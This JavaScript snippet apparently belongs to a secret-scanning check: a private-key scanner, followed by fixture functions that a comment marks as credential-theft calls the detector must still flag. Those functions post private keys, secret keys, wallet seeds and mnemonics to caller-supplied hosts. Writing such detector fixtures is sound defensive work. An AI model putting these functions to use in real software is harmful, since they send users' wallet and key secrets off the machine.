function reportPrivateKeys(file, text) {
  const isConformanceVector =
    /(?:^|\/)conformance\/(?:cases|fixtures|vectors)\//.test(
      normalizePath(file),
    )
  const pkHits = isConformanceVector ? [] : scanPrivateKeys(text)
  if (pkHits.length === 0) {
    return 0
  }
  logger.fail(`Private key found in: ${file}`)
  return 1
}

reportPrivateKeys(file, text)

// Genuine key-material reporting: keying material handed to report, send, or
// upload sinks. These MUST still read as credential-theft reporting calls.
export function reportPrivateKey(endpoint, privateKey) {
  return fetch(endpoint + '/report', {
    method: 'POST',
    body: JSON.stringify({ privateKey }),
  });
}

export function sendSecretKeyToCollector(url, secretKey) {
  const xhr = new XMLHttpRequest();
  xhr.open('POST', url);
  xhr.send(JSON.stringify({ secretKey }));
  return xhr;
}

export function uploadSeed(host, seed) {
  return fetch(host + '/backup', {
    method: 'PUT',
    body: JSON.stringify({ seed }),
  });
}

export function sendMnemonic(host, mnemonic) {
  return fetch(host + '/sync', {
    method: 'POST',
    body: JSON.stringify({ mnemonic }),
  });
}
